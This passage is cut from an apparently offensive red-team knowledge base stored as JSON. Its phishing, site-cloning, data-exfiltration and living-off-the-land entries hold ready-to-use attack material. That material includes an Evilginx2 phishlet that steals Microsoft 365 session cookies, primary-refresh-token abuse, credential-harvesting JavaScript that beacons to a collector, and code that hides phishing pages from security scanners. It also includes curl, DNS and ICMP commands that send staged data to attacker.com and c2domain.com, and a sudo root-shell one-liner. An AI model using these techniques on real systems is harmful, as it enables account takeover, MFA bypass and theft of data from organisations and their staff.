Label drives: \"Confidential — HR Q1 2026\" for urgency\n\n---\n\n## Phishing Platforms and Tools\n\n| Tool | Use Case | Notes |\n|------|----------|-------|\n| **GoPhish** | Campaign management, tracking | Open source, easy setup |\n| **Evilginx2** | MFA bypass via reverse proxy | Captures session cookies |\n| **Modlishka** | Reverse proxy phishing | Single-host alternative to Evilginx |\n| **SET** | Social-Engineer Toolkit | All-in-one, site cloner, mass mailer |\n| **King Phisher** | Advanced campaign platform | Python, plugin support |\n| **Zphisher** | Quick page cloning | 30+ built-in templates |\n| **Gophish + Evilginx** | Combined: tracking + MFA bypass | Best of both worlds |\n| **Swaks** | SMTP testing | Verify deliverability pre-campaign |\n\n---\n\n## Phishing Detection and Defenses (Blue Team Context)\n\nUnderstanding defenses informs bypass:\n\n| Defense | Bypass |\n|---------|--------|\n| Email gateway URL scan | HTML attachment (smuggling), QR code, delayed URL activation |\n| SPF/DKIM/DMARC | Set up correctly on attacker domain; spoof display name |\n| Safe Links (M365) | URL redirectors through trusted services (Google AMP, Cloudflare Workers) |\n| User training | Personalization via OSINT; urgency + authority combination |\n| MFA | Evilginx2 / real-time OTP relay via vishing |\n| Sandbox detonation | Check visitor IP against sandbox ranges; require CAPTCHA; time-delayed redirect |\n\n---\n\n## Vantablack Phishing Kit API\n\n```bash\n# Create campaign\ncurl -X POST /api/phishing/campaign -H \"X-API-Token: $T\" \\\n -d '{\"name\":\"Q1 Audit\",\"template\":\"office365\",\"redirect_url\":\"https://office.com\"}'\n\n# Clone login page\ncurl -X POST /api/phishing/campaign/CAMPAIGN_ID/clone \\\n -H \"X-API-Token: $T\" -d '{\"url\":\"https://login.microsoftonline.com\"}'\n\n# Generate lure (QR + email body)\ncurl -X POST /api/phishing/campaign/CAMPAIGN_ID/lure \\\n -H \"X-API-Token: $T\" -d '{\"type\":\"qr\",\"target_email\":\"victim@target.com\"}'\n\n# View captured credentials\ncurl /api/phishing/campaign/CAMPAIGN_ID/credentials -H \"X-API-Token: $T\"\n```\n\n## ◈ ADVANCED\n\n### AiTM at Scale — Primary Refresh Token Theft\n\nEvilginx2-style AiTM captures session cookies, but the highest-value target in Microsoft 365 environments is the **Primary Refresh Token (PRT)** — a device-bound long-lived token issued after first successful authentication. PRTs survive password resets and provide access across all M365 services.\n\n**AiTM PRT theft chain:**\n```\n1. AiTM phishing captures ESTSAUTH + ESTSAUTHPERSISTENT cookies\n2. Use captured cookies to authenticate to Microsoft Graph\n3. Register attacker-controlled device to Azure AD using captured session\n4. Request PRT issuance for registered device\n5. PRT persists even after victim changes password\n6. Use AADInternals or ROADtools to abuse PRT for all M365 services\n```\n\n**Conditional Access evasion via device compliance spoofing:**\n- CA policies requiring \"Compliant device\" check device compliance state via Intune\n- If you register an attacker device with stolen session, device starts as non-compliant\n- Bypass: enroll device in Intune via stolen session → wait for compliance check → CA passes\n- Alternative: find CA policy gaps (mobile device policies often less strict than desktop)\n\n**ROADtools PRT abuse:**\n```bash\n# After obtaining PRT via AiTM:\nroadtx gettokens --prt PRT_VALUE --prt-sessionkey SESSION_KEY \\\n --client-id 1b730954-1685-4b74-9bfd-dac224a7b894 # Azure PowerShell client\n# Returns access tokens for all M365 services without MFA\n```\n\n### Browser-in-the-Browser (BitB) Attack\n\nBitB creates a pixel-accurate fake browser popup that mimics OAuth consent screens. The victim sees `accounts.google.com` in what appears to be a browser address bar — but it is an HTML/CSS div, not a real window.\n\n```\nWhy it works:\n- OAuth flows legitimately open small popup windows\n- Users are trained to check the popup URL, not the parent page\n- BitB replicates the exact Chrome/Firefox/Safari window chrome in HTML\n- The fake address bar shows the real OAuth domain\n- Users cannot distinguish via visual inspection\n\nImplementation concept:\n- Parent page creates a div styled as a browser window\n- Inner content: real login form or phishing page\n- Fake title bar: pixel-matched to target browser\n- Fake address bar: shows legitimate URL (accounts.google.com)\n- mr.d0x BitB toolkit provides templates for Chrome/Firefox/macOS/Windows\n```\n\n**Detection:** Only way to detect is to try to drag the popup outside the browser window (a real popup can move outside; a div cannot) or check for the window in the OS taskbar (div won't appear).\n\n### FIDO2 / Passkey Bypass Strategies\n\nFIDO2 is origin-bound — the hardware key or platform authenticator cryptographically verifies the origin, so AiTM proxies cannot bypass it (the real site's origin is what's verified). However:\n\n**Social engineering downgrades:**\n```\n1. IT helpdesk pretext: \"We're upgrading your authentication method\"\n → victim is instructed to remove FIDO2 key and re-enroll\n → attacker exploits the window when only password/SMS MFA is active\n\n2. Backup method targeting: most orgs allow SMS/app OTP as FIDO2 backup\n → target the backup method, not FIDO2 itself\n → \"Your security key isn't working — use the code from your authenticator app\"\n\n3. Pre-enrollment phishing: target users before they enroll FIDO2\n → catch the account during initial FIDO2 setup flow\n → capture the activation link/code before user completes enrollment\n```\n\n### ML-Aware Lure Generation\n\nModern email gateways use ML classifiers trained on millions of phishing samples. Evasion requires crafting lures that don't match training data distributions:\n\n**Structural evasion:**\n- Harvest legitimate HTML email templates from the target org (available in breach data, marketing leaks, or sent to honeypot addresses)\n- Use the real template with minimal modifications — classifier sees familiar structure\n- Avoid trigger terms in subject: \"verify\", \"suspended\", \"urgent action\", \"confirm your\" → rephrase as natural business language\n\n**Reputation laundering:**\n- Send 100–500 legitimate emails from campaign domain before phishing send (newsletters, forward of public content)\n- Use same sending infrastructure for both legitimate and phishing sends — reputation carries\n- Warm-up tools: Lemwarm, Mailwarm automate this for commercial campaigns\n\n**Time-delayed activation:**\n- Initial email contains a \"safe\" URL (Google Docs, SharePoint, OneDrive link)\n- URL is legitimate at scan time (gateway clicks and sees benign content)\n- After 24–48 hours, document is edited to add phishing redirect\n- Victim clicks a day later — now lands on phishing page\n\n### Phishing-as-a-Service (PhaaS) Operational Patterns\n\nPhaaS platforms (Caffeine, Robin Banks, W3LL Panel) industrialize phishing — red team awareness:\n\n**PhaaS evasion features (for detection awareness):**\n- Encrypted HTML with per-victim decryption (each victim gets unique encrypted page)\n- Time-limited URLs: auto-expire after first use or N hours\n- IP geofencing: serve phishing page only to IPs from target country/ISP\n- Language filtering: block non-target-language browsers (fingerprint request headers)\n- CAPTCHA gates: slow down automated scanners\n\n**Defender detection of PhaaS infrastructure:**\n- Shared TLS certificates across campaigns (same cert CN for many \"unrelated\" domains)\n- Common URL path patterns: `/index/`, `/login/`, `/verify/` with predictable parameters\n- Kit fingerprints: specific HTML comments, JS variable names, or hidden form fields common across a kit's deployments\n- JARM fingerprints of the phishing server TLS stack", "last_updated": "2026-03-18"}, "site-cloning": {"slug": "site-cloning", "title": "Site Cloning", "category": "Phishing", "content": "# Site Cloning for Credential Harvesting\n\n## ◈ BEGINNER\n\n### What Is Site Cloning?\n\n**Site cloning** is creating a replica of a legitimate website — typically a login page — to trick victims into entering their credentials. The victim thinks they are on the real site but are on the attacker's server. Their submitted credentials are captured and stored, then the victim is redirected to the real site so they don't suspect anything went wrong.\n\n**Two approaches with very different capabilities:**\n\n- **Static clone** — downloads the HTML, CSS, and images from a target site and re-hosts them. Captures only username and password. Simple to deploy, no MFA bypass.\n- **Reverse proxy (Evilginx2/Modlishka)** — acts as a live proxy between victim and real site. The victim actually authenticates on the real site through the proxy. MFA is completed legitimately — but the proxy captures the resulting session cookie. Full account takeover even with MFA enabled.\n\n**Key terms:**\n- **Static clone** — a downloaded copy of a website's HTML/assets, re-hosted with a credential capture form\n- **Reverse proxy phishing** — proxying the real site in real time; captures session cookies after MFA completion\n- **Asset rewriting** — changing links in the cloned page to point to attacker-hosted resources instead of the real domain\n- **JavaScript injection** — code inserted into the cloned page that captures form data before submission and sends it to the attacker\n- **HTML smuggling** — delivering a phishing page as an encoded JavaScript blob inside an email attachment; bypasses email gateway URL scanners because no URL is visible in the email\n- **Captive portal phishing** — a fake WiFi login page served after connecting to an evil twin access point; captures WiFi/corporate credentials\n- **Session cookie** — the token issued after successful login that proves authentication; if stolen, provides access without knowing the password\n- **BeEF** — Browser Exploitation Framework; hooks victim browsers via XSS after they visit a cloned page\n- **MOTW (Mark of the Web)** — Windows flag added to files downloaded from the internet that restricts execution; HTML smuggling can bypass this for locally rendered blobs\n\n**When to use each technique:**\n- Simple internal apps with no MFA → static clone\n- Any Microsoft/Google/Okta target where MFA is present → Evilginx2 reverse proxy\n- WiFi credential harvest at physical assessment → captive portal\n- Email gateway URL scanning present → HTML smuggling delivery\n\n**Analogy:** A static clone is like a fake ATM fascia placed over a real ATM — it captures your card and PIN, then shows an error. A reverse proxy is like being an invisible relay between you and your bank — you complete everything normally, but I record every step and keep a copy of your session.\n\n## ◈ INTERMEDIATE\n\nSite cloning creates a pixel-perfect replica of a target login page to harvest credentials. Two primary approaches exist: static cloning (fetch-and-modify HTML) and reverse proxy (Evilginx2/Modlishka). Choosing the right technique depends on the authentication flow complexity and whether MFA bypass is required.\n\n### Static Clone vs Reverse Proxy\n\n| Factor | Static Clone | Reverse Proxy (Evilginx2) |\n|--------|-------------|--------------------------|\n| MFA bypass | No — only captures username/password | Yes — captures post-MFA session cookie |\n| SPA/React apps | Poor — JS-rendered content missing | Excellent — full live proxy |\n| Setup complexity | Low | Medium (DNS + VPS) |\n| Detection risk | Low (no live connection to target) | Medium (traffic to target) |\n| Best for | Simple login forms, internal apps | O365, Google, Okta, any MFA target |\n\n### Static Clone Workflow\n\n#### Step 1: Fetch with Realistic Headers\n```python\nimport httpx\n\nheaders = {\n 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',\n 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',\n 'Accept-Language': 'en-US,en;q=0.9',\n 'Accept-Encoding': 'gzip, deflate, br',\n}\n\nresp = httpx.get(target_url, headers=headers, follow_redirects=True, timeout=15)\nhtml = resp.text\n```\n\nRedirect following handles SSO flows, load balancers, and CDN rewrites.\n\n#### Step 2: Asset Rewriting\nTwo strategies:\n- **Hotlink CDN assets** — keep absolute URLs to `cdn.microsoft.com` etc. (realistic, but requires internet)\n- **Download and host locally** — fully offline, no external dependencies\n\n```python\nfrom bs4 import BeautifulSoup\nimport re\n\nsoup = BeautifulSoup(html, 'html.parser')\n\n# Rewrite all absolute URLs to proxy through attacker server\nfor tag in soup.find_all(['img', 'script', 'link'], src=True):\n if tag.get('src', '').startswith('http'):\n tag['src'] = f\"/proxy?url={tag['src']}\"\nfor tag in soup.find_all('link', href=True):\n if tag.get('href', '').startswith('http'):\n tag['href'] = f\"/proxy?url={tag['href']}\"\n```\n\n#### Step 3: JavaScript Injection\nInject credential capture hook before ``:\n```javascript\n\n```\n\n#### Step 4: Multi-Step Form Handling\nMicrosoft O365 and Google use two-step flows (email → password). Handle with session storage:\n```javascript\n// Step 1: capture email\nsessionStorage.setItem('phish_user', emailField.value);\n// Step 2: capture password, combine, submit\nvar username = sessionStorage.getItem('phish_user');\n// POST both together to capture endpoint\n```\n\n### Evilginx2 Reverse Proxy (MFA Bypass)\n\nEvilginx2 acts as a transparent proxy between victim and real site. All traffic passes through, Evilginx captures session cookies after MFA completion.\n\n#### Infrastructure Setup\n```bash\n# VPS: Ubuntu 22.04 with ports 80, 443, 53 open\n# DNS: A record for phishlet subdomain → VPS IP\n# A record: login.corporate-target.com → VPS (typosquat)\n# Wildcard: *.login.corporate-target.com → VPS\n\n# Install\ngo install github.com/kgretzky/evilginx2@latest\n\n# Run (binds to 53, 80, 443)\nsudo ./evilginx2 -p phishlets/ -developer\n```\n\n#### Evilginx2 Configuration\n```\nconfig domain corporate-target.com\nconfig ipv4 \nphishlets hostname o365 corporate-target.com\nphishlets enable o365\nlures create o365\nlures get-url 0\n```\n\n#### Phishlet YAML Structure\n```yaml\nname: 'office365'\nauthor: 'operator'\nmin_ver: '3.0.0'\nproxy_hosts:\n - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com',\n session: true, is_landing: true, auto_filter: true}\n - {phish_sub: 'account', orig_sub: 'account', domain: 'microsoft.com',\n session: false, is_landing: false}\nsub_filters:\n - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login',\n domain: 'microsoftonline.com', search: 'microsoftonline\\.com',\n replace: 'corporate-target.com', mimes: ['text/html','application/javascript']}\nauth_tokens:\n - domain: '.microsoftonline.com'\n keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'buid', 'esctx']\n - domain: '.microsoft.com'\n keys: ['MC1', 'MSFPC']\ncredentials:\n username:\n key: 'login'\n search: '(.*)'\n type: 'post'\n password:\n key: 'passwd'\n search: '(.*)'\n type: 'post'\nlogin:\n domain: 'login.microsoftonline.com'\n path: '/common/oauth2/authorize'\n```\n\n#### Session Token Replay\nAfter Evilginx captures tokens:\n```bash\n# In Evilginx2 console\nsessions # list captured sessions\nsessions 1 # view session 1 with cookies\n\n# Import captured cookies into browser via EditThisCookie extension\n# Or use with Microsoft Graph API\naz login --use-device-code # then replace tokens\n# Or: use captured Bearer token directly\ncurl -H \"Authorization: Bearer CAPTURED_TOKEN\" \\\n \"https://graph.microsoft.com/v1.0/me/messages\"\n```\n\n**MFA bypass works because:** victim completes MFA on the *real* site via Evilginx proxy, real site issues authenticated session cookie, Evilginx captures it. MFA was completed legitimately — but attacker now holds the resulting session.\n\n### HTML Smuggling Delivery\n\nBypass email gateways (which scan URLs but not inline JavaScript blobs):\n```html\n\n\n\n\n\n\n```\n\nDeliver via email as `.html` attachment — gateway scans HTML statically, sees no URLs, passes through.\n\n### Captive Portal Phishing\n\nCombine evil twin + cloned captive portal for WiFi MITM:\n```bash\n# 1. Evil twin with hostapd\nsudo hostapd /tmp/evil_twin_hostapd.conf &\n\n# 2. DHCP + DNS via dnsmasq (DNS resolves all to attacker IP)\nsudo dnsmasq -C /tmp/evil_twin_dnsmasq.conf --no-daemon &\n\n# 3. Redirect all HTTP to captive portal\nsudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.69.1:80\nsudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 192.168.69.1:443\n\n# 4. Serve cloned hotel/corporate WiFi portal on 192.168.69.1\n# Credentials captured before granting internet access\n```\n\n### Domain Selection for Lure URLs\n\n| Strategy | Example | Notes |\n|----------|---------|-------|\n| Typosquatting | `microsoftonllne.com` | Common letter swap |\n| Homograph/IDN | `mіcrosoft.com` (Cyrillic і) | Looks identical in some fonts |\n| Subdomain | `login.microsoft.com.attacker.io` | User only reads `microsoft.com` |\n| Similar TLD | `microsoft.co`, `microsoft.net` | Plausible |\n| Open redirect | `microsoft.com/l?url=attacker.io` | Legitimate domain in URL |\n| Google Translate | `translate.google.com/translate?u=attacker.io` | Legitimate Google URL |\n| Google AMP | `google.com/amp/s/attacker.io` | AMP proxy |\n\n### Vantablack Clone API\n\n```bash\n# Clone a target URL\ncurl -X POST /api/phishing/campaign/CAMPAIGN_ID/clone \\\n -H \"X-API-Token: $TOKEN\" \\\n -d '{\"url\": \"https://login.microsoftonline.com\"}'\n\n# Response: {html, assets_count, inject_script}\n# Deploy html to nginx/Apache on phishing VPS\n\n# Capture credential (called by injected JS in cloned page)\nPOST /api/phishing/campaign/CAMPAIGN_ID/capture\n{\"username\": \"victim@target.com\", \"password\": \"Password123!\", \"ip\": \"10.0.0.50\"}\n```\n\n### OpSec\n\n- Deploy phishing pages behind Cloudflare to hide VPS IP (CDN provides additional legitimacy)\n- Monitor for automated scanners: rate-limit by IP, kill switch to redirect to legitimate site when hit\n- Rotate campaign domains every 48-72 hours (domain categorization can change)\n- Use domain aged 30+ days and pre-categorized as business/finance for delivery\n- Never serve phishing page to IP ranges of AV vendors, browser safe-browsing crawlers, or security researchers (maintain IP blocklist)\n- Log all visitor IPs and User-Agents — security researchers often have distinctive UA strings\n\n## ◈ ADVANCED\n\n### Automated Clone Pipeline with Dynamic Injection\n\nFor large-scale campaigns targeting multiple orgs, automate the clone-inject-serve pipeline:\n\n```python\n# Headless Chrome clone (handles JS-rendered SPAs, not just static HTML)\n# Use Playwright to capture fully-rendered DOM after JS execution\n\nfrom playwright.sync_api import sync_playwright\n\ndef clone_spa(target_url: str) -> str:\n with sync_playwright() as p:\n browser = p.chromium.launch()\n page = browser.new_page()\n page.goto(target_url, wait_until='networkidle')\n # Capture fully rendered DOM (includes dynamically added elements)\n html = page.content()\n browser.close()\n return html\n\n# After capture: inject credential harvester, rewrite assets, serve\n```\n\n**Why Playwright matters:** React/Angular SPAs render via JavaScript. A simple HTTP fetch gets the raw HTML with `
` — no visible content. Playwright executes JavaScript and returns the full rendered DOM.\n\n### Polyglot Delivery — HTML + ZIP + ISO Chain\n\nEvade email gateway analysis with a delivery chain:\n\n```\nChain: ISO → folder → HTML file → renders clone locally (blob URL)\n\nStep 1: Clone target login page, encode as base64 JS variable\nStep 2: Wrap in HTML smuggling page (JS decodes and renders inline blob)\nStep 3: Package HTML file inside an ISO image\n - ISO files bypass MOTW on Windows (files extracted from ISO aren't marked)\n - Email gateways often don't detonate ISO contents\nStep 4: Deliver ISO via email as \"secure document\" attachment\n\nVictim opens ISO → sees folder → opens HTML file\nHTML file runs in browser, decodes and renders the cloned login page\nVictim enters credentials → captured to attacker C2\n```\n\n### Fingerprint-Aware Clone Serving\n\nModern blue teams deploy honeytokens and canary credentials. Serve different content to suspected scanners:\n\n```python\n# Flask-based serving with visitor fingerprinting\n\nSCANNER_UA_FRAGMENTS = ['scanner', 'crawler', 'zgrab', 'masscan', 'nmap']\nSCANNER_IP_RANGES = ['66.249.', '54.162.', '13.56.'] # Google, AWS scanners\n\ndef should_serve_phish(request):\n ua = request.headers.get('User-Agent', '')\n ip = request.remote_addr\n\n # Check UA for scanner signatures\n if any(f in ua.lower() for f in SCANNER_UA_FRAGMENTS):\n return False\n\n # Check IP against known scanner ranges\n if any(ip.startswith(r) for r in SCANNER_IP_RANGES):\n return False\n\n # Require JavaScript execution (bots often skip JS)\n if not request.cookies.get('js_verified'):\n return False # served redirect page with JS cookie setter first\n\n return True\n\n# Non-phish response: redirect to legitimate site (appears benign to scanners)\n```\n\n### DOM Observation for Multi-Step Form Capture\n\nModern SSO flows (Microsoft, Google) use multi-step forms and redirect chains. Capture across steps:\n\n```javascript\n// MutationObserver watches for dynamically added form fields\n// Captures data even when form fields are added/removed by JS framework\n\nconst observer = new MutationObserver(() => {\n const pwField = document.querySelector('input[type=\"password\"]');\n if (pwField && !pwField._hooked) {\n pwField._hooked = true;\n pwField.addEventListener('change', (e) => {\n const user = sessionStorage.getItem('_captured_user');\n // beacon to collector\n navigator.sendBeacon('/collect', JSON.stringify({\n u: user, p: e.target.value, ts: Date.now()\n }));\n });\n }\n});\nobserver.observe(document.body, {childList: true, subtree: true});\n```\n\n### Clone Infrastructure OPSEC\n\n- **Dedicated serving IP per campaign**: If one IP gets blocklisted, other campaigns unaffected\n- **Cloudflare in front**: hides real VPS IP; provides legitimate TLS cert appearance; Cloudflare's IP reputation is high\n- **Canary redirect**: if same IP visits more than 3 times in 10 min → redirect to real site (scanner detection)\n- **No server-side logging of credentials to disk**: write directly to in-memory store or encrypted remote endpoint; avoid logs with plaintext passwords\n- **Kill switch**: single URL parameter or time-based auto-disable after campaign window closes; prevents post-engagement credential exposure", "last_updated": "2026-03-18"}, "data-exfiltration": {"slug": "data-exfiltration", "title": "Data Exfiltration Techniques", "category": "Post Exploitation", "content": "# Data Exfiltration Techniques\n\n## ◈ BEGINNER\n\n### What is Data Exfiltration?\n\nData exfiltration is the process of copying and transferring data out of a compromised environment to the attacker's infrastructure. In red team operations, this demonstrates what an attacker could steal and provides evidence of the breach's potential impact.\n\n**Why is this a distinct skill?**\nGetting data out is harder than getting in. Organizations deploy Data Loss Prevention (DLP) tools, monitor for large file transfers, inspect outbound network traffic, and block certain protocols. Exfiltrating gigabytes of data while evading these controls requires careful technique selection.\n\n**Key terms:**\n- **DLP (Data Loss Prevention)** — security tools that monitor and block sensitive data leaving the network\n- **staging** — collecting and preparing data for exfiltration (compress, encrypt, split into chunks)\n- **exfiltration channel** — the network protocol used to transfer data out (HTTPS, DNS, ICMP, email)\n- **covert channel** — a communication method that hides data inside legitimate-looking traffic (DNS queries, ICMP payloads, image files)\n- **steganography** — hiding data inside another file (an image, audio file) so it appears innocuous\n- **chunking** — splitting large files into small pieces to avoid volumetric DLP alerts\n\n**The exfiltration workflow:**\n1. Discover and identify high-value data (credentials, documents, source code, customer data)\n2. Stage data: compress, encrypt, and optionally split into chunks\n3. Choose an exfiltration channel that matches the environment's egress controls\n4. Transfer data, rate-limiting to avoid triggering DLP alerts\n5. Verify data was received, then clean up staging files\n\n**Analogy:** Exfiltration is like shoplifting from a store with cameras and security guards. You stuff items into your jacket (staging), walk out through the fire exit instead of the main door (covert channel), leave items spread across multiple trips (chunking), and wear an employee uniform (mimicking legitimate traffic).\n\n## ◈ INTERMEDIATE\n\nIdentifying, staging, and extracting sensitive data from compromised environments while evading DLP and monitoring.\n\n## Data Discovery\n\n**Windows**:\n```cmd\n:: Search for sensitive files by content\nfindstr /SI /M \"password\" *.txt *.ini *.config *.xml *.cfg\nfindstr /SI /M \"connectionString\" *.config *.xml\ndir /s /b *.kdbx *.key *.pfx *.p12 *.pem *.ppk 2>nul\n\n:: PowerShell recursive search\nGet-ChildItem -Path C:\\ -Recurse -Include *.docx,*.xlsx,*.pdf,*.sql -ErrorAction SilentlyContinue | Where-Object { $_.Length -lt 50MB }\n\n:: Sensitive file locations\ndir %USERPROFILE%\\Documents\\ %USERPROFILE%\\Desktop\\ %USERPROFILE%\\Downloads\\ /s /b\n```\n\n**Linux**:\n```bash\nfind / -name \"*.sql\" -o -name \"*.dump\" -o -name \"*.bak\" -o -name \"*.conf\" -o -name \"*.key\" 2>/dev/null\ngrep -rIl \"password\\|secret\\|api_key\\|token\" /etc/ /opt/ /var/www/ /home/ 2>/dev/null | head -50\n```\n\n## Data Staging\n\nBefore exfiltration, compress and encrypt data to reduce size and prevent content inspection:\n\n```bash\n# Compress + encrypt (Linux)\ntar czf - /path/to/data | gpg -c --cipher-algo AES256 --passphrase 'strong_key' -o staged.tar.gz.gpg\n\n# 7-Zip with AES-256 (Windows)\n7z a -p\"strong_key\" -mhe=on staged.7z C:\\data\\sensitive\\\n\n# Split large archives\nsplit -b 50M staged.tar.gz.gpg staged_part_\n```\n\nAlways encrypt before exfiltration — plaintext transfer is detectable by DLP/IDS content inspection.\n\n## HTTPS Exfiltration\n\n```bash\n# Direct upload to attacker server\ncurl -X POST -F \"file=@staged.7z\" https://attacker.com/upload\n\n# OneDrive (Microsoft Graph API)\ncurl -H \"Authorization: Bearer $TOKEN\" \\\n -H \"Content-Type: application/octet-stream\" \\\n -X PUT \"https://graph.microsoft.com/v1.0/me/drive/root:/exfil/data.7z:/content\" \\\n --data-binary @staged.7z\n\n# AWS S3 presigned URL\naws s3 presign s3://exfil-bucket/data.7z --expires-in 3600\ncurl -X PUT -T staged.7z \"PRESIGNED_URL\"\n```\n\n## DNS Exfiltration\n\nEncode data in DNS subdomain labels (works when only DNS egress is available):\n\n```bash\n# Base32 encode data, split into 63-char labels (DNS label limit)\nbase32 staged.7z | fold -w 63 | while read chunk; do\n dig +short \"$chunk.c2domain.com\" @resolver\ndone\n\n# dnscat2 (bidirectional DNS tunnel)\n# Server: dnscat2-server c2domain.com\n# Client: dnscat2 c2domain.com\n```\n\nDNS exfil is slow (~50 bytes per query) but extremely difficult to block since DNS is required for network operation.\n\n## Cloud Sync Abuse\n\nIf the target machine has cloud sync agents already installed and authenticated:\n\n```\n# OneDrive: copy files to OneDrive sync folder → auto-syncs to cloud\ncopy staged.7z %USERPROFILE%\\OneDrive\\Documents\\\n\n# Google Drive: similar approach with Google Drive sync folder\n# Dropbox: ~/Dropbox/\n```\n\nThis uses the legitimate sync agent — traffic appears normal to DLP and network monitoring.\n\n## Chunked Exfiltration\n\nFor large datasets, exfil in small chunks to avoid DLP volumetric alerts:\n\n```bash\nsplit -b 1M staged.7z.gpg chunk_\n\nfor f in chunk_*; do\n curl -X POST -F \"file=@$f\" https://attacker.com/upload\n sleep $((RANDOM % 300 + 60)) # 1-6 minute random delay\ndone\n```\n\n## Rate Limiting for DLP Evasion\n\n- Exfiltrate during business hours to blend with normal traffic\n- Match upload sizes to typical file sharing patterns\n- Use legitimate cloud services the organization already uses\n- Spread exfil over days/weeks for large datasets\n\n## OpSec Notes\n\n- Encryption before exfil prevents content-based DLP detection\n- Cloud API exfil through legitimate services is hardest to detect\n- DNS exfil generates anomalous query volumes — detectable by DNS analytics\n- Large file transfers trigger volumetric DLP alerts — chunk and spread over time\n- SMB exfil to external IPs is easily detected — use only for internal staging\n- Document all exfiltrated data for the engagement report\n- Ensure exfiltrated data is handled according to ROE (secure storage, deletion timeline)\n\n## ◈ ADVANCED\n\n### Steganographic Exfiltration\n\nHide data inside image files — bypasses keyword-based DLP and most content inspection:\n\n```python\n# LSB steganography: embed data in least-significant bits of pixels\n# Image looks identical to original — DLP sees a normal JPEG\n# Upload to Slack, Teams, or imgur — looks like photo sharing\n\nfrom PIL import Image\nimport numpy as np\n\ndef lsb_embed(carrier_path, data_bytes, output_path):\n img = Image.open(carrier_path).convert('RGB')\n pixels = np.array(img)\n data_bits = ''.join(format(b, '08b') for b in data_bytes)\n data_bits += '1111111111111110' # EOF marker\n flat = pixels.flatten()\n for i, bit in enumerate(data_bits):\n flat[i] = (flat[i] & ~1) | int(bit)\n out = flat.reshape(pixels.shape)\n Image.fromarray(out.astype('uint8')).save(output_path)\n```\n\n### ICMP Payload Exfiltration\n\nICMP echo requests are allowed through most egress filters:\n\n```python\nfrom scapy.all import *\nimport base64\n\ndef exfil_icmp(data, target_ip):\n chunks = [data[i:i+1000] for i in range(0, len(data), 1000)]\n for i, chunk in enumerate(chunks):\n payload = base64.b64encode(chunk)\n send(IP(dst=target_ip)/ICMP()/Raw(load=payload), verbose=0)\n time.sleep(0.5)\n\nwith open(\"loot.zip\", \"rb\") as f:\n exfil_icmp(f.read(), \"LHOST\")\n```\n\n### Exfiltration Via Whitelisted Web Services\n\nOrganizations frequently whitelist traffic to legitimate services — use them as covert exfil channels:\n\n| Service | Technique | Notes |\n|---|---|---|\n| Slack | Webhook POST with file attachment | Usually whitelisted |\n| GitHub Gist | Create private gist via API | Encrypted content |\n| Pastebin | Create private paste via API | Rate limited |\n| Dropbox | Upload via API token | DLP may miss API traffic |\n| Google Drive | Upload via service account | Hard to block |\n| Telegram | Bot API with file upload | End-to-end encrypted |\n\n### DNS over HTTPS (DoH) Exfiltration\n\nBypass DNS-level DLP by tunneling DNS queries through HTTPS to legitimate resolvers:\n\n```bash\n# Traffic appears as HTTPS to dns.google.com or cloudflare-dns.com\n# Not inspectable by traditional DNS monitoring\ncurl -H \"Accept: application/dns-message\" \\\n \"https://dns.google.com/resolve?name=ENCODED_DATA.c2domain.com&type=A\"\n```\n\nDoH defeats DNS visibility tools (firewalls that log DNS, internal DNS servers) since all queries go to the external HTTPS resolver encrypted.\n\n### Protocol Covert Channels for Low-Bandwidth Exfil\n\nWhen all standard channels are blocked, use protocol headroom for data encoding:\n\n```\nHTTP/2 pseudo-header values: encode small amounts of data in unusual header values\nTLS session tickets: embed data in the session ticket blob (encrypted, large)\nTCP timestamp values: 4 bytes per packet — slow but invisible\nHTTP cookie values: large cookies carry data; look like tracking cookies\nX-Forwarded-For chains: encode in header chains passing through proxies\n```\n\nThese techniques are extremely low-bandwidth (kilobytes/hour) but essentially undetectable — useful for slow-exfil of critical credentials while leaving bulk data for higher-bandwidth channels.\n\n### Large Dataset Bulk Exfiltration\n\nFor multi-GB datasets where speed matters more than stealth:\n\n```bash\n# Compress + encrypt before exfil\ntar czf - /path/to/data | openssl enc -aes-256-cbc -pass pass:$KEY | \\\n split -b 25m - chunk_\n\n# Upload chunks via HTTPS with rate limiting\nfor chunk in chunk_*; do\n curl -X POST -F \"file=@$chunk\" https://your-collector.com/upload \\\n -H \"Authorization: Bearer $TOKEN\"\n sleep 30 # 25MB/30s = ~50 KB/s — below typical DLP thresholds\ndone\n```\n\nRate limit uploads to stay under volumetric DLP thresholds — typically 100 MB/day per user is below alert levels in most enterprise environments.", "last_updated": "2026-03-18"}, "living-off-the-land": {"slug": "living-off-the-land", "title": "Living Off the Land (LOLBAS/GTFOBins)", "category": "Post Exploitation", "content": "# Living Off the Land (LOLBAS / GTFOBins)\n\n## ◈ BEGINNER\n\n### What is \"Living Off the Land\"?\n\n\"Living Off the Land\" (LOTL) means using the tools, binaries, and scripts that already exist on the target system to accomplish your objectives — rather than uploading your own tools. On Windows these are called LOLBins (Living Off the Land Binaries); on Linux they're documented at GTFOBins.\n\n**Why avoid custom tools?**\n- Every file you upload is a potential indicator: antivirus scans it, EDR tracks it, forensics finds it\n- Signed Microsoft binaries are inherently trusted — they have valid digital signatures\n- Many security tools create allowlists for common system tools (certutil, mshta, rundll32)\n- Native tools are already present — no upload required\n\n**Key terms:**\n- **LOLBin** — a legitimate system binary repurposed for offensive use (download, execute, persist)\n- **LOLBAS** — LOL Binaries And Scripts; the Windows-focused resource cataloguing these binaries\n- **GTFOBins** — \"Get The F*** Out Binaries\"; Linux-focused resource for escaping restricted shells, escalating privileges, and reading/writing files via native tools\n- **AppLocker bypass** — using a whitelisted Microsoft binary to execute code despite AppLocker policies\n- **BYOVD** — Bring Your Own Vulnerable Driver; using a legitimate but vulnerable driver for kernel-level access\n\n**Examples:**\n- `certutil` was designed to manage certificates — also downloads files from URLs\n- `mshta` runs HTML Applications — also executes arbitrary VBScript/JScript\n- `python3` on a restricted server with SUID bit — `python3 -c \"import os; os.setuid(0)\"` gives root\n- `find` with sudo — `sudo find / -exec /bin/bash \\;` gives a root shell\n\n**Analogy:** Imagine breaking into a hardware store and using the store's own tools to break into the safe — you're using 